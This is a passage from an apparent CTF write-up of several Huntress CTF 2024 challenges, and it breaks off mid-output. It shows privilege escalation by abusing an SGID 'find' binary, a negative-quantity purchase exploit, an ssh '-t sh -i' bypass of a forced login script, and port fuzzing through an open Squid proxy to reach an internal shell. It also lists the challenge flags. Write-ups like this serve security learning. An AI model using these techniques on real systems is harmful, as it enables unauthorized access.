</span></span><span class="line"><span class="cl">./usr/lib/python3/dist-packages/ssh_import_id-5.11.egg-info/entry_points.txt
</span></span><span class="line"><span class="cl">./usr/lib/python3/dist-packages/ssh_import_id-5.11.egg-info/top_level.txt
</span></span><span class="line"><span class="cl">./usr/lib/python3/dist-packages/ssh_import_id-5.11.egg-info/dependency_links.txt
</span></span><span class="line"><span class="cl">./usr/lib/python3/dist-packages/distro-1.9.0.dist-info/entry_points.txt
</span></span><span class="line"><span class="cl">./usr/lib/python3/dist-packages/distro-1.9.0.dist-info/top_level.txt
</span></span><span class="line"><span class="cl">./usr/lib/python3/dist-packages/dbus_python-1.3.2.egg-info/top_level.txt
</span></span><span class="line"><span class="cl">./usr/lib/python3/dist-packages/dbus_python-1.3.2.egg-info/dependency_links.txt
</span></span><span class="line"><span class="cl">./usr/lib/python3.12/LICENSE.txt
</span></span><span class="line"><span class="cl">./home/finder/flag.txt
</span></span><span class="line"><span class="cl">user@finders-fee-4e5001a519aad066-699457c45c-9ns4x:/$ cat /home/finder/flag.txt
</span></span><span class="line"><span class="cl">cat: /home/finder/flag.txt: Permission denied
</span></span><span class="line"><span class="cl">user@finders-fee-4e5001a519aad066-699457c45c-9ns4x:/$ ls -al /home/finder/flag.txt
</span></span><span class="line"><span class="cl">ls: cannot access &#39;/home/finder/flag.txt&#39;: Permission denied
</span></span><span class="line"><span class="cl">user@finders-fee-4e5001a519aad066-699457c45c-9ns4x:/$ which find
</span></span><span class="line"><span class="cl">/usr/bin/find
</span></span><span class="line"><span class="cl">user@finders-fee-4e5001a519aad066-699457c45c-9ns4x:/$ ls -al /usr/bin/find
</span></span><span class="line"><span class="cl">-rwxr-sr-x 1 root finder 204264 Apr  8  2024 /usr/bin/find
</span></span></code></pre></td></tr></table>
</div>
</div><p>Turns out there is SGID, meaning it executes as finder group.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">user@finders-fee-4e5001a519aad066-699457c45c-9ns4x:/$ find /home/finder/flag.txt -exec cat {} \;
</span></span><span class="line"><span class="cl">flag{63a10f0440218364424b20f9ddf6ad39}
</span></span></code></pre></td></tr></table>
</div>
</div><hr>
<h3 id="whamazon">Whamazon
</h3><blockquote>
<p>Wham! Bam! Amazon is entering the hacking business! Can you buy a flag?</p>
<p>Author: @JohnHammond</p>
</blockquote>
<p>Going to the landing page is a small interactive terminal. We have $50, and it seems we need to buy the flag for $1000000000.</p>
<p><img src="/post/huntress-ctf-2024/Images/Whamazon_1.png"
	width="914"
	height="719"
	srcset="/post/huntress-ctf-2024/Images/Whamazon_1_hu1510505574267684000.png 480w, /post/huntress-ctf-2024/Images/Whamazon_1_hu12998172993291415807.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="127"
		data-flex-basis="305px"
	
></p>
<p>We are slightly short, so we need to make money somehow. Anything that is not a digit seems to fail, so it&rsquo;s looking like injection is not an option. When we try to buy 0 apples, it seems to &ldquo;succeed&rdquo;</p>
<p><img src="/post/huntress-ctf-2024/Images/Whamazon_2.png"
	width="467"
	height="391"
	srcset="/post/huntress-ctf-2024/Images/Whamazon_2_hu7652091228325425530.png 480w, /post/huntress-ctf-2024/Images/Whamazon_2_hu12410492405070040118.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="119"
		data-flex-basis="286px"
	
></p>
<p>If we try negative numbers, this also seems to work and gives us the money difference!</p>
<p><img src="/post/huntress-ctf-2024/Images/Whamazon_3.png"
	width="512"
	height="388"
	srcset="/post/huntress-ctf-2024/Images/Whamazon_3_hu134420583240156999.png 480w, /post/huntress-ctf-2024/Images/Whamazon_3_hu13095559334995367761.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="131"
		data-flex-basis="316px"
	
></p>
<p>Now we just need to buy <code>-100000000</code> apples and we will have enough money! However the challenge is not over:</p>
<p><img src="/post/huntress-ctf-2024/Images/Whamazon_4.png"
	width="726"
	height="744"
	srcset="/post/huntress-ctf-2024/Images/Whamazon_4_hu3745862447736473403.png 480w, /post/huntress-ctf-2024/Images/Whamazon_4_hu8160465176713810550.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="97"
		data-flex-basis="234px"
	
></p>
<p>I thought this was a situation where you had to select all 3 options to win, but I wasn&rsquo;t able to pick more than 1 option. I guess it&rsquo;s easy to get more money if you fail the random guess, but I managed to win 1st try:</p>
<p><img src="/post/huntress-ctf-2024/Images/Whamazon_5.png"
	width="632"
	height="346"
	srcset="/post/huntress-ctf-2024/Images/Whamazon_5_hu13784581273243541858.png 480w, /post/huntress-ctf-2024/Images/Whamazon_5_hu14692038505324541388.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="182"
		data-flex-basis="438px"
	
></p>
<p>Now we can grab the flag from the main inventory:</p>
<p><img src="/post/huntress-ctf-2024/Images/Whamazon_6.png"
	width="956"
	height="277"
	srcset="/post/huntress-ctf-2024/Images/Whamazon_6_hu15706300709329886080.png 480w, /post/huntress-ctf-2024/Images/Whamazon_6_hu10562249660149193899.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="345"
		data-flex-basis="828px"
	
></p>
<p><code>flag{18bdd83cee5690321bb14c70465d3408}</code></p>
<hr>
<h3 id="unbelievable">Unbelievable
</h3><blockquote>
<p>Don&rsquo;t believe everything you see on the Internet!<br>
Anyway, have you heard this intro soundtrack from Half-Life 3?</p>
<p>Author: @JohnHammond</p>
</blockquote>
<p>Step 1: open file
<img src="/post/huntress-ctf-2024/Images/halflife.png"
	width="807"
	height="278"
	srcset="/post/huntress-ctf-2024/Images/halflife_hu13398979278063164110.png 480w, /post/huntress-ctf-2024/Images/halflife_hu7267984067062484955.png 1024w"
	loading="lazy"
	
		alt="flag"
	
	
		class="gallery-image" 
		data-flex-grow="290"
		data-flex-basis="696px"
	
></p>
<p>Not sure if I missed something, but that was literally all it took for me.</p>
<p><code>flag{a85466991f0a8dc3d9837a5c32fa0c91}</code></p>
<hr>
<h3 id="zulu">Zulu
</h3><blockquote>
<p>Did you know that zulu is part of the phonetic alphabet?</p>
<p>Author: @JohnHammond</p>
</blockquote>
<p>We are given a file with no extension:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ file zulu 
</span></span><span class="line"><span class="cl">zulu: compress&#39;d data 16 bits
</span></span></code></pre></td></tr></table>
</div>
</div><p>It looks compressed, so I just throw it into 7zip:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ 7z x zulu
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
</span></span><span class="line"><span class="cl">p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,4 CPUs Intel(R) Core(TM) i5-4690K CPU @ 3.50GHz (306C3),ASM,AES-NI)
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Scanning the drive for archives:
</span></span><span class="line"><span class="cl">1 file, 46 bytes (1 KiB)
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Extracting archive: zulu
</span></span><span class="line"><span class="cl">--
</span></span><span class="line"><span class="cl">Path = zulu
</span></span><span class="line"><span class="cl">Type = Z
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Everything is Ok
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Size:       39
</span></span><span class="line"><span class="cl">Compressed: 46
</span></span></code></pre></td></tr></table>
</div>
</div><p>A bit funny that the uncompressed file is smaller than compressed.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ cat zulu~
</span></span><span class="line"><span class="cl">flag{74235a9216ee609538022e6689b4de5c}
</span></span></code></pre></td></tr></table>
</div>
</div><hr>
<h3 id="typo">Typo
</h3><blockquote>
<p>Gosh darnit, I keep entering a typo in my Linux command prompt!</p>
<p>Author: @JohnHammond</p>
</blockquote>
<p>Every time we ssh, we are shown a train before exiting. No interruption commands work.</p>
<p>Just add -t courtesy <a class="link" href="https://stackoverflow.com/questions/18522647/run-ssh-and-immediately-execute-command"  target="_blank" rel="noopener"
    >https://stackoverflow.com/questions/18522647/run-ssh-and-immediately-execute-command</a> to choose a command on entry. For this, we must select a non-bash shell to enter.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(kali㉿kali)-[~/Documents/huntressctf]
</span></span><span class="line"><span class="cl">└─$ ssh -p 30880 user@challenge.ctf.games -t &#39;sh -i&#39; 
</span></span><span class="line"><span class="cl">user@challenge.ctf.games&#39;s password: 
</span></span><span class="line"><span class="cl">~ $ id
</span></span><span class="line"><span class="cl">uid=1000(user) gid=1000(user) groups=1000(user)
</span></span><span class="line"><span class="cl">~ $ ls -al
</span></span><span class="line"><span class="cl">total 20
</span></span><span class="line"><span class="cl">drwxr-sr-x    1 user     user          4096 Oct  7 18:29 .
</span></span><span class="line"><span class="cl">drwxr-xr-x    1 root     root          4096 Oct  7 18:29 ..
</span></span><span class="line"><span class="cl">-rwxr-xr-x    1 user     user          3780 Oct  7 18:29 .bashrc
</span></span><span class="line"><span class="cl">-rw-r--r--    1 user     user            17 Oct  7 18:29 .profile
</span></span><span class="line"><span class="cl">-r--------    1 user     user            39 Oct  7 18:29 flag.txt
</span></span><span class="line"><span class="cl">~ $ cat flag.txt
</span></span><span class="line"><span class="cl">flag{36a0354fbf59df454596660742bf09eb}
</span></span></code></pre></td></tr></table>
</div>
</div><hr>
<h2 id="miscellaneous">Miscellaneous
</h2><h3 id="permission-to-proxy">Permission To Proxy
</h3><blockquote>
<p>Where do we go from here?<br>
Escalate your privileges and find the flag in root&rsquo;s home directory.<br>
<strong>Yes, the error message you see on startup is intentional. ;)</strong></p>
<p>Author: @JohnHammond</p>
</blockquote>
<p>When we launch the instance, right away we see squid proxy.</p>
<p><img src="/post/huntress-ctf-2024/Images/squid.png"
	width="636"
	height="435"
	srcset="/post/huntress-ctf-2024/Images/squid_hu9699988118270649865.png 480w, /post/huntress-ctf-2024/Images/squid_hu16218478360966607472.png 1024w"
	loading="lazy"
	
		alt="Landing page"
	
	
		class="gallery-image" 
		data-flex-grow="146"
		data-flex-basis="350px"
	
></p>
<p>This is just a proxy, so it isn&rsquo;t clear right away what our &ldquo;target&rdquo; is. There is no other host information, so my best guess is to hit localhost. We can guess ports  until we find something, but I decide to throw it into <code>ffuf</code>. We have to remember that we are pivoting from a proxy and targeting localhost, <code>127.0.0.1</code>:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(kali㉿kali)-[~/Documents/hunstressctf]
</span></span><span class="line"><span class="cl">└─$ ffuf -x http://challenge.ctf.games:32614/ -u http://127.0.0.1:FUZZ -w nums.txt -fc 403 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        /&#39;___\  /&#39;___\           /&#39;___\       
</span></span><span class="line"><span class="cl">       /\ \__/ /\ \__/  __  __  /\ \__/       
</span></span><span class="line"><span class="cl">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
</span></span><span class="line"><span class="cl">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
</span></span><span class="line"><span class="cl">         \ \_\   \ \_\  \ \____/  \ \_\       
</span></span><span class="line"><span class="cl">          \/_/    \/_/   \/___/    \/_/       
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">       v2.1.0-dev
</span></span><span class="line"><span class="cl">________________________________________________
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"> :: Method           : GET
</span></span><span class="line"><span class="cl"> :: URL              : http://127.0.0.1:FUZZ
</span></span><span class="line"><span class="cl"> :: Wordlist         : FUZZ: /home/kali/Documents/huntressctf/nums.txt
</span></span><span class="line"><span class="cl"> :: Follow redirects : false
</span></span><span class="line"><span class="cl"> :: Calibration      : false
</span></span><span class="line"><span class="cl"> :: Proxy            : http://challenge.ctf.games:32614/
</span></span><span class="line"><span class="cl"> :: Timeout          : 10
</span></span><span class="line"><span class="cl"> :: Threads          : 40
</span></span><span class="line"><span class="cl"> :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
</span></span><span class="line"><span class="cl"> :: Filter           : Response status: 403
</span></span><span class="line"><span class="cl">________________________________________________
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">22                      [Status: 200, Size: 60, Words: 3, Lines: 3, Duration: 178ms]
</span></span><span class="line"><span class="cl">50000                   [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 197ms]
</span></span></code></pre></td></tr></table>
</div>
</div><p>The ssh port <code>22</code> shows up immediately, and after spinning for a bit we also see a high number port <code>50000</code>. We have no username or password for now, so starting to look with 50000:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="err">┌──</span><span class="p">(</span><span class="n">kali</span><span class="err">㉿</span><span class="n">kali</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="o">~/</span><span class="n">Documents</span><span class="o">/</span><span class="n">huntressctf</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="err">└─</span><span class="o">$</span> <span class="n">curl</span> <span class="o">--</span><span class="n">proxy</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">challenge</span><span class="o">.</span><span class="n">ctf</span><span class="o">.</span><span class="n">games</span><span class="p">:</span><span class="mi">32614</span> <span class="mf">127.0</span><span class="o">.</span><span class="mf">0.1</span><span class="p">:</span><span class="mi">50000</span> <span class="o">-</span><span class="n">v</span>
</span></span><span class="line"><span class="cl"><span class="o">*</span>   <span class="n">Trying</span> <span class="mf">35.193</span><span class="o">.</span><span class="mf">148.143</span><span class="p">:</span><span class="mf">32614.</span><span class="o">..</span>
</span></span><span class="line"><span class="cl"><span class="o">*</span> <span class="n">Connected</span> <span class="n">to</span> <span class="n">challenge</span><span class="o">.</span><span class="n">ctf</span><span class="o">.</span><span class="n">games</span> <span class="p">(</span><span class="mf">35.193</span><span class="o">.</span><span class="mf">148.143</span><span class="p">)</span> <span class="n">port</span> <span class="mi">32614</span>
</span></span><span class="line"><span class="cl"><span class="o">&gt;</span> <span class="n">GET</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">127.0</span><span class="o">.</span><span class="mf">0.1</span><span class="p">:</span><span class="mi">50000</span><span class="o">/</span> <span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span>
</span></span><span class="line"><span class="cl"><span class="o">&gt;</span> <span class="n">Host</span><span class="p">:</span> <span class="mf">127.0</span><span class="o">.</span><span class="mf">0.1</span><span class="p">:</span><span class="mi">50000</span>
</span></span><span class="line"><span class="cl"><span class="o">&gt;</span> <span class="n">User</span><span class="o">-</span><span class="n">Agent</span><span class="p">:</span> <span class="n">curl</span><span class="o">/</span><span class="mf">8.4</span><span class="o">.</span><span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;...</span><span class="n">SNIP</span><span class="o">...&gt;</span>
</span></span><span class="line"><span class="cl"><span class="n">bash</span><span class="o">-</span><span class="mf">4.4</span><span class="o">$</span> <span class="n">GET</span> <span class="o">/</span> <span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">HTML</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">HEAD</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">TITLE</span><span class="o">&gt;</span><span class="ne">Directory</span> <span class="o">/&lt;/</span><span class="n">TITLE</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">BASE</span> <span class="n">HREF</span><span class="o">=</span><span class="s2">&#34;file:/&#34;</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;/</span><span class="n">HEAD</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">BODY</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">H1</span><span class="o">&gt;</span><span class="ne">Directory</span> <span class="n">listing</span> <span class="n">of</span> <span class="o">/&lt;/</span><span class="n">H1</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">UL</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">LI</span><span class="o">&gt;&lt;</span><span class="n">A</span> <span class="n">HREF</span><span class="o">=</span><span class="s2">&#34;./&#34;</span><span class="o">&gt;./&lt;/</span><span class="n">A</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">LI</span><span class="o">&gt;&lt;</span><span class="n">A</span> <span class="n">HREF</span><span class="o">=</span><span class="s2">&#34;../&#34;</span><span class="o">&gt;../&lt;/</span><span class="n">A</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">LI</span><span class="o">&gt;&lt;</span><span class="n">A</span> <span class="n">HREF</span><span class="o">=</span><span class="s2">&#34;.docker-entrypoint.sh&#34;</span><span class="o">&gt;.</span><span class="n">docker</span><span class="o">-</span><span class="n">entrypoint</span><span class="o">.</span><span class="n">sh</span><span class="o">&lt;/</span><span class="n">A</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">LI</span><span class="o">&gt;&lt;</span><span class="n">A</span> <span class="n">HREF</span><span class="o">=</span><span class="s2">&#34;bin/&#34;</span><span class="o">&gt;</span><span class="n">bin</span><span class="o">/&lt;/</span><span class="n">A</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">LI</span><span class="o">&gt;&lt;</span><span class="n">A</span> <span class="n">HREF</span><span class="o">=</span><span class="s2">&#34;boot/&#34;</span><span class="o">&gt;</span><span class="n">boot</span><span class="o">/&lt;/</span><span class="n">A</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">LI</span><span class="o">&gt;&lt;</span><span class="n">A</span> <span class="n">HREF</span><span class="o">=</span><span class="s2">&#34;dev/&#34;</span><span class="o">&gt;</span><span class="n">dev</span><span class="o">/&lt;/</span><span class="n">A</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">LI</span><span class="o">&gt;&lt;</span><span class="n">A</span> <span class="n">HREF</span><span class="o">=</span><span class="s2">&#34;etc/&#34;</span><span class="o">&gt;</span><span class="n">etc</span><span class="o">/&lt;/</span><span class="n">A</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">LI</span><span class="o">&gt;&lt;</span><span class="n">A</span> <span class="n">HREF</span><span class="o">=</span><span class="s2">&#34;home/&#34;</span><span class="o">&gt;</span><span class="n">home</span><span class="o">/&lt;/</span><span class="n">A</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">LI</span><span class="o">&gt;&lt;</span><span class="n">A</span> <span class="n">HREF</span><span class="o">=</span><span class="s2">&#34;lib/&#34;</span><span class="o">&gt;</span><span class="n">lib</span><span class="o">/&lt;/</span><span class="n">A</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">LI</span><span class="o">&gt;&lt;</span><span class="n">A</span> <span class="n">HREF</span><span class="o">=</span><span class="s2">&#34;lib64/&#34;</span><span class="o">&gt;</span><span class="n">lib64</span><span class="o">/&lt;/</span><span class="n">A</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">LI</span><span class="o">&gt;&lt;</span><span class="n">A</span> <span class="n">HREF</span><span class="o">=</span><span class="s2">&#34;media/&#34;</span><span class="o">&gt;</span><span class="n">media</span><span class="o">/&lt;/</span><span class="n">A</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">LI</span><span class="o">&gt;&lt;</span><span class="n">A</span> <span class="n">HREF</span><span class="o">=</span><span class="s2">&#34;mnt/&#34;</span><span class="o">&gt;</span><span class="n">mnt</span><span class="o">/&lt;/</span><span class="n">A</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">LI</span><span class="o">&gt;&lt;</span><span class="n">A</span> <span class="n">HREF</span><span class="o">=</span><span class="s2">&#34;opt/&#34;</span><span class="o">&gt;</span><span class="n">opt</span><span class="o">/&lt;/</span><span class="n">A</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">LI</span><span class="o">&gt;&lt;</span><span class="n">A</span> <span class="n">HREF</span><span class="o">=</span><span class="s2">&#34;proc/&#34;</span><span class="o">&gt;</span><span class="n">proc</span><span class="o">/&lt;/</span><span class="n">A</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">LI</span><span class="o">&gt;&lt;</span><span class="n">A</span> <span class="n">HREF</span><span class="o">=</span><span class="s2">&#34;root/&#34;</span><span class="o">&gt;</span><span class="n">root</span><span class="o">/&lt;/</span><span class="n">A</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">LI</span><span class="o">&gt;&lt;</span><span class="n">A</span> <span class="n">HREF</span><span class="o">=</span><span class="s2">&#34;run/&#34;</span><span class="o">&gt;</span><span class="n">run</span><span class="o">/&lt;/</span><span class="n">A</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">LI</span><span class="o">&gt;&lt;</span><span class="n">A</span> <span class="n">HREF</span><span class="o">=</span><span class="s2">&#34;sbin/&#34;</span><span class="o">&gt;</span><span class="n">sbin</span><span class="o">/&lt;/</span><span class="n">A</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">LI</span><span class="o">&gt;&lt;</span><span class="n">A</span> <span class="n">HREF</span><span class="o">=</span><span class="s2">&#34;srv/&#34;</span><span class="o">&gt;</span><span class="n">srv</span><span class="o">/&lt;/</span><span class="n">A</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">LI</span><span class="o">&gt;&lt;</span><span class="n">A</span> <span class="n">HREF</span><span class="o">=</span><span class="s2">&#34;sys/&#34;</span><span class="o">&gt;</span><span class="n">sys</span><span class="o">/&lt;/</span><span class="n">A</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">LI</span><span class="o">&gt;&lt;</span><span class="n">A</span> <span class="n">HREF</span><span class="o">=</span><span class="s2">&#34;tmp/&#34;</span><span class="o">&gt;</span><span class="n">tmp</span><span class="o">/&lt;/</span><span class="n">A</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">LI</span><span class="o">&gt;&lt;</span><span class="n">A</span> <span class="n">HREF</span><span class="o">=</span><span class="s2">&#34;usr/&#34;</span><span class="o">&gt;</span><span class="n">usr</span><span class="o">/&lt;/</span><span class="n">A</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">LI</span><span class="o">&gt;&lt;</span><span class="n">A</span> <span class="n">HREF</span><span class="o">=</span><span class="s2">&#34;var/&#34;</span><span class="o">&gt;</span><span class="k">var</span><span class="o">/&lt;/</span><span class="n">A</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;/</span><span class="n">UL</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;/</span><span class="n">BODY</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;/</span><span class="n">HTML</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">html</span><span class="o">&gt;&lt;</span><span class="n">body</span><span class="o">&gt;&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="mi">403</span> <span class="n">Forbidden</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="n">Request</span> <span class="n">forbidden</span> <span class="n">by</span> <span class="n">administrative</span> <span class="n">rules</span><span class="o">.</span>
</span></span><span class="line"><span class="cl"><span class="o">&lt;/</span><span class="n">body</span><span class="o">&gt;&lt;/</span><span class="n">html</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="n">bash</span><span class="o">-</span><span class="mf">4.4</span><span class="o">$</span> 
</span></span><span class="line"><span class="cl"><span class="n">bash</span><span class="o">-</span><span class="mf">4.4</span><span class="o">$</span> <span class="n">User</span><span class="o">-</span><span class="n">Agent</span><span class="p">:</span> <span class="n">curl</span><span class="o">/</span><span class="mf">8.4</span><span class="o">.</span><span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="n">bash</span><span class="p">:</span> <span class="n">User</span><span class="o">-</span><span class="n">Agent</span><span class="p">::</span> <span class="n">command</span> <span class="ow">not</span> <span class="n">found</span>
</span></span><span class="line"><span class="cl"><span class="n">bash</span><span class="o">-</span><span class="mf">4.4</span><span class="o">$</span> 
</span></span><span class="line"><span class="cl"><span class="n">bash</span><span class="o">-</span><span class="mf">4.4</span><span class="o">$</span> <span class="n">Accept</span><span class="p">:</span> <span class="o">*/*</span>
